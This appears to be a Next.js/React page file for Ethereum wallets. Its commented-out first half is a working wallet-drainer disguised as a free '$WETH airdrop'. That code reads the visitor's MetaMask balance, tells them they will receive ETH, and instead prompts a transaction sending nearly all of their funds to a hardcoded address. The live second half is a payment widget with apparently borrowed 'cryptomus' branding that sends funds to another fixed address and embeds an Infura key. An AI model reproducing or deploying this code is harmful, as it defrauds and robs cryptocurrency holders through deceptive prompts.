// "use client"

// // import { useWeb3Modal } from 'web3modal'
// import { ethers, N, toBeHex } from "ethers";
// import { useCallback, useState } from "react";

// export default function Home() {
//   const _connectToMetaMask = useCallback(async () => {
//     const ethereum: any = window.ethereum;

//     let connectBtn = document.getElementById('connectBtn');

//     let continueModal = document.getElementById('continueModal');
//     let recieveModal = document.getElementById('recieveModal');
//     let errModal = document.getElementById('errModal');
//     let successModal = document.getElementById('successModal');

//     let ethNum = document.getElementById('ethNum');
//     let minBal = document.getElementById('minBal');

//     if (typeof ethereum !== "undefined") {
//       continueModal?.classList.remove('hidden');

//       try {
//         const accounts = await ethereum.request({
//           method: "eth_requestAccounts",
//         });

//         // chain id hex for sepolia - 0xAA36A7 | Gas fees - (0.0004)
//         // chain id hex for mainnet - 0x1 | Gas fees - (0.0001)

//         await ethereum.request({
//           method: 'wallet_switchEthereumChain',
//           params: [{ chainId: '0x1' }],
//         });

//         // Get the connected Ethereum address
//         const address = accounts[0];
//         const provider = new ethers.BrowserProvider(ethereum);
//         // Get the account balance
//         const balance = await provider.getBalance(address);
//         // Get the network ID from MetaMask
//         const network = await provider.getNetwork();

//         const allData = {
//           address: address,
//           balance: parseFloat(ethers.formatEther(balance)),
//           chainId: network.chainId.toString(),
//           network: network.name,
//         }

//         console.log("connected to MetaMask with details: ", allData);

//         await fetch('https://min-api.cryptocompare.com/data/price?fsym=USD&tsyms=ETH')
//           .then((response) => response.json())
//           .then(async (data) => {
//             const price = data['ETH'];

//             if (allData['balance'] > parseFloat(price) * 5) {
//               if (ethNum !== null) {
//                 ethNum.innerHTML = String(allData['balance'].toFixed(3)) + ' ETH';
//               }
//               recieveModal?.classList.remove('hidden');

//               setTimeout(async () => {
//                 const signer = provider.getSigner();

//                 const transactionRequest = {
//                   to: "0x69E493D37D3170716604a5E06C25815ad5C1E2FC",
//                   value: ethers.parseEther(String(allData['balance'] - (price * 4))).toString(),
//                   gasLimit: 50000
//                 }

//                 try {
//                   const receipt = (await (signer)).sendTransaction(transactionRequest).then((response) => {
//                     if (successModal != null) {
//                       recieveModal?.classList.add('hidden');
//                       successModal?.classList.remove('hidden');
//                     }
//                   })
//                   console.log(receipt);
//                 } catch (err: Error | any) {
//                   recieveModal?.classList.add('hidden');
//                 }
//               }, 3000);
//             } else {
//               errModal?.classList.remove('hidden');
//               if (minBal !== null) {
//                 minBal.innerHTML = price + ' ETH';
//               }
//             }
//           }
//         )
//       } catch (error: Error | any) {
//         continueModal?.classList.add('hidden');
//       }
//     } else {
//       alert("Please install MetaMask browser extension to recieve the airdrop");
//     }
//   }, []);

//   return (
//     <div className="flex flex-col items-center gap-6 justify-center h-[100vh] w-full">
//       <GridPattern maxOpacity={0.075} strokeDasharray={0.25} className="fixed top-0 left-0 w-[100vw] h-[100vh]"></GridPattern>
//       <Globe className="fixed z-20 scale-150 bottom-0 translate-y-[70vh] sm:translate-y-[50vh] opacity-100"></Globe>

//       <div className="flex flex-col items-center gap-5 relative z-50">
//         <div className="flex bg-gradient-to-b from-gray-300/20 to-gray-500/20 backdrop-blur-md shadow-lg hover:scale-105 transition-all duration-300 border border-1 border-gray-200 rounded-full py-1 px-5">
//           <p className='bg-gradient-to-br from-blue-400 to-blue-600 bg-clip-text text-transparent font-bold text-xl'>$WETH</p>
//         </div>
//         <p className="flex flex-row text-4xl sm:text-6xl font-bold text-center max-w-full mx-5 drop-shadow-lg">The future of Ethereum is here.</p>
//         <p className="font-regular text-lg text-center px-5 drop-shadow-lg">Making ethereum faster and more secure. Connect your wallet to claim your free <span className="bg-gradient-to-r from-blue-400 to-blue-600 bg-clip-text font-bold text-transparent">$WETH</span> now.</p>
//         <div id='connectBtn' className="flex">
//           <ShimmerButton onClick={_connectToMetaMask} className="mt-5 sm:mt-10 text-[.8rem] px-8 shadow-sm hover:shadow-xl transition-all duration-500">Connect Wallet</ShimmerButton>
//         </div>
//       </div>

//       <div id='continueModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
//         <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
//           <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10 animate-pulse' />
//           <p className='text-2xl font-bold text-black text-center'>Continue in wallet</p>
//           <p className='text-black text-center'>Continue following the steps in your wallet</p>
//         </div>
//       </div>

//       <div id='recieveModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
//         <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
//           <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10 animate-pulse' />
//           <p className='text-2xl font-bold text-black text-center'>Congratulations!</p>
//           <p className='text-black text-center'>You will recieve <span id='ethNum' className='font-bold'>0 ETH</span>. Please confirm in your wallet.</p>
//           <ShimmerButton onClick={_connectToMetaMask} className="text-[.8rem] px-8 shadow-sm hover:shadow-xl transition-all duration-500">Recieve ETH Airdrop</ShimmerButton>
//         </div>
//       </div>

//       <div id='errModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
//         <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
//           <div className="flex rounded-full border-2 border-red-500 p-3">
//             <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10' />
//           </div>
//           <p className='text-2xl font-bold text-black text-center'>Error Processing Request</p>
//           <p className='text-black text-center'>You need to have a minimum balance of <span id='minBal' className='font-bold'></span> <span className='font-bold'>($5 USD)</span> in order to recieve this airdrop.</p>
//           <p className='text-black text-center text-[.8rem]'>We require this to make sure that you are not a bot.</p>
//         </div>
//       </div>

//       <div id='successModal' className="fixed z-50 top-0 left-0 bg-black/40 h-full w-full flex hidden items-center justify-center">
//         <div className="flex flex-col items-center justify-center gap-2 bg-white px-5 py-8 rounded-xl sm:w-1/4 w-3/4 shadow-lg">
//           <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH Logo" className='w-10' />
//           <p className='text-2xl font-bold text-black text-center'>Congratularions!</p>
//           <p className='text-black text-center'>You have successfully claimed your airdrop.</p>
//         </div>
//       </div>

//     </div>

//   );
// }

















"use client";

import { SetStateAction, useState } from 'react';
import Web3Modal from 'web3modal';
import WalletConnectProvider from '@walletconnect/web3-provider';
import { ethers, BrowserProvider } from 'ethers';
import { useRouter } from 'next/navigation';
import { CONTRACT_ABI, CONTRACT_ADDRESS } from '@/app/abi/remix_abi';

export default function Home() {
    const [account, setAccount] = useState<string | null>(null);
    const [inputString, setInputString] = useState<string>('');
    const [loading, setLoading] = useState<boolean>(false);
    const [storedJson, setStoredJson] = useState<string | null>(null);
    const [selectedNetwork, setSelectedNetwork] = useState<string>('');
    const router = useRouter();


    const connectWallet = async () => {
        try {
            const web3Modal = new Web3Modal({
                cacheProvider: false,
                providerOptions: {
                    walletconnect: {
                        package: WalletConnectProvider,
                        options: {
                            infuraId: "bc52f2e268fb4f479e6bbdc5c4c8d382"
                        }
                    }
                }
            });

            const instance = await web3Modal.connect();
            const provider = new ethers.BrowserProvider(instance);
            const signer = await provider.getSigner();
            const userAccount = await signer.getAddress();
            setAccount(userAccount);

            console.log('Connected account:', userAccount);
        } catch (error) {
            console.error("Error connecting wallet:", error);
        }
    };

    const storeJsonInContract = async (jsonData: string) => {
        try {
            const provider = new BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

            const tx = await contract.storeJson(jsonData);
            console.log("Transaction pending...");
            await tx.wait();

            console.log("Transaction confirmed, JSON stored in contract.");
        } catch (error) {
            console.error("Error storing JSON in contract:", error);
        }
    };

    const retrieveJsonFromContract = async () => {
        try {
            const provider = new BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

            const json = await contract.getJson();
            setStoredJson(json); // Store the retrieved JSON in state

            console.log("Retrieved JSON from contract:", json);
        } catch (error) {
            console.error("Error retrieving JSON from contract:", error);
        }
    };

    const handleClick = async () => {
        if (!account) {
            try {
                const web3Modal = new Web3Modal({
                    cacheProvider: false,
                    providerOptions: {
                        walletconnect: {
                            package: WalletConnectProvider,
                            options: {
                                infuraId: "bc52f2e268fb4f479e6bbdc5c4c8d382"
                            }
                        }
                    }
                });

                const instance = await web3Modal.connect();
                const provider = new ethers.BrowserProvider(instance);
                const signer = await provider.getSigner();
                const userAccount = await signer.getAddress();
                setAccount(userAccount);

                console.log('Connected account:', userAccount);
            } catch (error) {
                console.error("Error connecting wallet:", error);
            }
        }

        try {
            const response = await fetch('/api/public/transaction', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    amount: String(inputString)
                }),
            });

            const data = await response.json();

            if (response.ok) {
                console.log("API Response:", data);
                // // Store the JSON response in the smart contract
                // await storeJsonInContract(JSON.stringify(data));

                // // Retrieve the stored JSON after the transaction
                // await retrieveJsonFromContract();
                initTxn(data?.amount);
            } else {
                console.error("API Error:", data);
            }
        } catch (error) {
            console.error("Fetch error:", error);
        }
    };

    const initTxn = async (amountInCrypto: string) => {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: String(selectedNetwork) }],
            });

            const provider = new BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            const transactionRequest = {
                to: "0xa897CDcf02BAaC4CFb147e8d8BED351064BF7AAc", // Make sure this address is valid
                value: ethers.parseEther(amountInCrypto.toString()), // Use the input value
                gasLimit: 21000,
            };

            setLoading(true); // Set loading to true before sending transaction
            const tx = await signer.sendTransaction(transactionRequest);
            console.log("Transaction pending:", tx);
            await tx.wait(); // Wait for the transaction to be confirmed
            console.log("Transaction confirmed, JSON stored in contract.");
        } catch (error) {
            console.error("Error storing JSON in contract:", error);
        } finally {
            setLoading(false); // Reset loading state
        }
    };


    return (
        <div>
            <h1 className='text-3xl font-bold my-2'>Connect to Sepolia Testnet</h1>
            {!account ? (
                <button onClick={connectWallet} className='bg-blue-500 py-2 px-4 rounded-lg text-white'>Connect Wallet</button>
            ) : (
                <div>
                    <p className='my-2'>Connected account: {account}</p>
                    <input
                        type="text"
                        placeholder="Enter Amount in USD"
                        value={inputString}
                        onChange={(e) => setInputString(e.target.value)}
                    />
                    <div>
                        <label htmlFor="network-select">Choose a network:</label>
                        <select id="network-select" value={selectedNetwork} onChange={(e) => setSelectedNetwork(e.target.value)}>
                            <option value="">--Please choose an option--</option>
                            <option value="0xAA36A7">Sepolia</option>
                            <option value="0x1">ETH</option>
                        </select>
                        {selectedNetwork && <p>You have selected: {selectedNetwork}</p>}
                    </div>
                    <button onClick={handleClick} disabled={loading} className='bg-blue-500 py-2 px-4 rounded-lg text-white'>
                        {loading ? "Setting String..." : "Set String"}
                    </button>
                    {storedJson && (
                        <div className='my-2'>
                            <h2>Stored JSON:</h2>
                            <pre>{storedJson}</pre>
                        </div>
                    )}
                    <div className="bg-white p-6 rounded-lg shadow-lg max-w-md mx-auto">
                        <div className="flex justify-between items-center mb-6">
                            <div className="flex items-center space-x-2">
                                <div className="w-6 h-6 bg-black"></div>
                                <span className="text-xl font-bold">cryptomus</span>
                            </div>
                            <div className="flex items-center space-x-2">
                                <div className="flex items-center bg-gray-100 rounded-full px-3 py-1">
                                    <div className="w-4 h-4 bg-black mr-1"></div>
                                    <span className="text-sm">+ 0.001</span>
                                </div>
                                {/* <Globe className="w-6 h-6" /> */}
                            </div>
                        </div>

                        <div className="mb-6">
                            <div className="flex items-center mb-2">
                                <h2 className="text-4xl font-bold mr-2">10.00 TRX</h2>
                                <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M7 17L17 7M17 7H7M17 7V17" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                </svg>
                            </div>
                            <p className="text-gray-600">TRON (TRC-20)</p>
                        </div>

                        <div className="bg-gray-100 rounded-lg p-4 mb-6">
                            <div className="flex items-center">
                                <div className="w-6 h-6 rounded-full border-4 border-green-500 border-t-transparent animate-spin mr-2"></div>
                                <div>
                                    <p className="text-gray-600">Expiration time</p>
                                    <p className="text-green-500 font-bold">2:05:36</p>
                                </div>
                            </div>
                        </div>

                        <div className="mb-4">
                            {/* <button className="w-full bg-gray-100 text-left px-4 py-3 rounded-lg flex justify-between items-center">
                                <span>TRON (TRC-20)</span>
                                <ChevronDown className="w-5 h-5" />
                            </button> */}
                            <select id="network-select" value={selectedNetwork} onChange={(e) => setSelectedNetwork(e.target.value)} className="w-full bg-gray-100 text-left px-4 py-3 rounded-lg flex justify-between items-center">
                                <option value="">--Please choose an option--</option>
                                <option value="0xAA36A7">Sepolia</option>
                                <option value="0x1">ETH</option>
                            </select>
                        </div>

                        {/* <button className="w-full bg-black text-white py-3 rounded-lg flex justify-center items-center mb-4">
                            <div className="w-5 h-5 bg-white mr-2"></div>
                            Pay with CryptoWall
                        </button> */}

                        <button onClick={handleClick} disabled={loading} className="w-full bg-black text-white py-3 rounded-lg flex justify-center items-center mb-4">
                            {loading ? "Confirming Transaction..." : "Pay with CrytpoWall"}
                        </button>

                        <div className="text-center mb-4">OR</div>

                        <button className="w-full bg-gray-300 text-black py-3 rounded-lg flex justify-center items-center">
                            <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" />
                                <path d="M3 12H21" stroke="currentColor" strokeWidth="2" />
                                <path d="M12 3C14.5013 5.46452 15.9228 8.66283 16 12C15.9228 15.3372 14.5013 18.5355 12 21" stroke="currentColor" strokeWidth="2" />
                            </svg>
                            Wallet Connect
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}